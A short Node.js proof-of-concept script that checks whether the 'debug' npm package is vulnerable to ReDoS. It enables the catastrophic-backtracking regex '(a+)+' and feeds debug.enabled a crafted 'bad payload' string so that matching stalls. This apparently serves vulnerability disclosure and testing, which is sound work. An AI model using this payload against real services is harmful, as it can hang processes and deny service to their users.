var debug = require('debug');

console.log('\nPOC: Checking if "debug" is vulnerable to ReDos.\n\n');

// Malicious Regex
regex = '(a+)+'
debug.enable(regex)

console.log("Executing good payload...")
const a = debug.enabled('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
console.log("Finished. Result is :: " + a)

// Payload
console.log("\nExecuting bad payload...")
const b = debug.enabled('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX')
console.log("Finished. Result is :: " + b)